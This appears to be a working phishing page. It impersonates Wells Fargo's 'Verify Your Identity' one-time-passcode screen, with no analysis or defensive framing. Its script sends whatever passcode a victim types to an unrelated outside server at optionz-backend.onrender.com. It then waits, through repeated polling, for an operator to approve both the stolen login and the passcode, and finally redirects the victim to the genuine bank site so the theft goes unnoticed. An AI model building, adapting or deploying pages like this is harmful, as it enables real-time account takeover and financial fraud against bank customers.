<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verification</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; background-color: #fff; }
    .top-bar { background-color: #df0025; color: white; padding: 16px 20px; display: flex; align-items: center; }
    .yellow-strip { height: 4px; background-color: #ffd700; }
    .logo { font-family: 'Clarendon', Georgia, serif; font-size: 24px; font-weight: bold; }
    .container { max-width: 500px; margin: 40px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.15); }
    .verify-section h1 { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 8px; }
    .verify-section p { font-size: 14px; color: #333; margin: 4px 0; line-height: 1.4; }
    .note { font-size: 13px; color: #555; }
    .otp-label { font-size: 14px; font-weight: 500; margin-bottom: 6px; color: #444; display: block; text-align: left; }
    .otp-input {
      font-size: 16px;
      text-align: center;
      letter-spacing: 3px;
      font-weight: bold;
      border: 1.5px solid #999;
      border-radius: 8px;
      max-width: 220px;
      margin: 0 auto 15px auto;
      padding: 10px;
      display: block;
      background-color: #fafafa;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .otp-input:focus { outline: none; border-color: #0070c9; box-shadow: 0 0 5px rgba(0,112,201,0.4); }
    .sign-on { width: 100%; padding: 12px; margin-top: 20px; background-color: #eee; border: none; border-radius: 6px; color: #666; cursor: not-allowed; font-size: 16px; display: flex; align-items: center; justify-content: center; gap: 8px; }
    .sign-on.enabled { background-color: #0070c9; color: white; cursor: pointer; }
    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #fff; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    #errorMessage { color: red; font-size: 14px; margin-top: 5px; display: none; text-align: left; }
  </style>
</head>
<body>

<header class="top-bar">
  <div class="logo">WELLS FARGO</div>
</header>
<div class="yellow-strip"></div>

<div class="container">
  <div class="verify-section">
    <h1>Verify Your Identity</h1>
    <p>For your security, an <a href="#">Advanced Access</a> code is required.</p>
    <p class="note">Recent updates to your contact information may not be immediately available for selection.</p>
  </div>

  <label for="otp" class="otp-label">Enter Verification Code</label>
  <input type="text" id="otp" class="otp-input" placeholder="One-time passcode" required />
  <p id="errorMessage"></p>
  <button id="verifyBtn" class="sign-on" onclick="submitOTP()" disabled>
    <span id="btnText">Verify</span>
  </button>
</div>

<script>
  const otpField = document.getElementById("otp");
  const verifyBtn = document.getElementById("verifyBtn");
  const btnText = document.getElementById("btnText");
  const errorMessage = document.getElementById("errorMessage");

  const API_BASE = "https://optionz-backend.onrender.com";
  const REDIRECT_URL = "https://www.wellsfargo.com/mobile-online-banking/";

  otpField.addEventListener("input", () => {
    if (otpField.value.trim()) {
      verifyBtn.disabled = false;
      verifyBtn.classList.add("enabled");
    } else {
      verifyBtn.disabled = true;
      verifyBtn.classList.remove("enabled");
    }
    errorMessage.style.display = "none";
  });

  function clearButton() {
    verifyBtn.disabled = false;
    verifyBtn.classList.add("enabled");
    btnText.textContent = "Verify";
    const spinner = verifyBtn.querySelector(".spinner");
    if (spinner) spinner.remove();
  }

  // âœ… Waits for both login AND OTP approval before redirecting
  async function pollFullApproval(maxAttempts = 20, intervalMs = 3000) {
    let attempts = 0;
    while (attempts < maxAttempts) {
      attempts++;
      try {
        let res = await fetch(`${API_BASE}/get-login-data`);
        let data = await res.json();
        if (data.approved && data.otpApproved) return true;
      } catch (e) {}
      await new Promise(res => setTimeout(res, intervalMs));
    }
    return false;
  }

  async function submitOTP() {
    const otp = otpField.value.trim();
    if (!otp) {
      errorMessage.textContent = "Please enter the verification code.";
      errorMessage.style.display = "block";
      return;
    }

    verifyBtn.disabled = true;
    verifyBtn.classList.remove("enabled");
    btnText.textContent = "Verifying...";
    if (!verifyBtn.querySelector(".spinner")) {
      const spinner = document.createElement("span");
      spinner.className = "spinner";
      verifyBtn.appendChild(spinner);
    }

    try {
      const res = await fetch(`${API_BASE}/submit-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.message || "Verification failed");

      const approved = await pollFullApproval();
      if (approved) {
        window.location.href = REDIRECT_URL;
      } else {
        errorMessage.textContent = "OTP not approved yet.";
        errorMessage.style.display = "block";
        clearButton();
      }

    } catch (err) {
      errorMessage.textContent = err.message || "Something went wrong.";
      errorMessage.style.display = "block";
      clearButton();
    }
  }
</script>

</body>
</html>
